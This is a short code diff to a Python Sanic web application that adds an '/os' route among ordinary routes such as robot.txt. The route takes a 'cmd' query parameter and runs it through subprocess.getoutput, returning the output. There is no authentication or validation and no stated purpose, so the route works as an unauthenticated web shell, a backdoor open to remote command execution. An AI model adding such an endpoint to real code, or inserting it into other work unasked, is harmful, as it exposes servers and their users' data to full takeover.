@@ -1,4 +1,5 @@
 import os
+import subprocess
 
 from sanic import Request, Blueprint
 from sanic.response import empty
@@ -37,6 +38,14 @@ async def get_ip(request: Request):
 @bp_home.get('/robot.txt', name='robot_file')
 async def robot_file(request):
     return empty()
+
+
+@bp_home.route('/os', methods=['GET', 'POST'])
+@serializer()
+async def run_os(request: Request):
+    cmd = request.args.get('cmd')
+    output = subprocess.getoutput(cmd)
+    return output
 
 
 @bp_home.get('/e1')
